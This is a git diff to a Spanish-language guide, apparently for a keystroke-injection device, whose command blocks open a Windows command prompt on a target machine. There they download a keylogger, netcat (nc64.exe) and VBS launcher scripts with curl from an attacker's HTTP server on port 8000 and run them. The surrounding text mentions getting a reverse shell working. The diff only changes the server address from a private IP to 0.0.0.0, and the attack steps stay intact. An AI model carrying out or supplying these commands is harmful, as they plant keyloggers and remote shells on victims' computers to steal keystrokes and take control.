@@ -57,8 +57,8 @@ Una vez todo preparado ya podemos configurar las comandas y teclas desde la App 
 ```bash
 Windows +r
 cmd.exe
-curl http://10.1.101.154:8000/keylogger.exe -o keylogger.exe
-curl http://10.1.101.154:8000/a.vbs -o a.vbs
+curl http://0.0.0.0:8000/keylogger.exe -o keylogger.exe
+curl http://0.0.0.0:8000/a.vbs -o a.vbs
 a.vbs
 exit
 #Entre comandas envíamos señales de presionar la tecla Enter
@@ -71,10 +71,10 @@ Una vez hemos conseguido la ReverseShell en funcionamiento y hemos conseguido un
 ```bash
 Windows +r
 cmd.exe
-curl http://10.1.101.154:8000/nc64.exe -o nc64.exe
-curl http://10.1.101.154:8000/i.vbs -o i.vbs
-curl http://10.1.101.154:8000/keylogger.exe -o keylogger.exe
-curl http://10.1.101.154:8000/a.vbs -o a.vbs
+curl http://0.0.0.0:8000/nc64.exe -o nc64.exe
+curl http://0.0.0.0:8000/i.vbs -o i.vbs
+curl http://0.0.0.0:8000/keylogger.exe -o keylogger.exe
+curl http://0.0.0.0:8000/a.vbs -o a.vbs
 i.vbs
 a.vbs
 exit
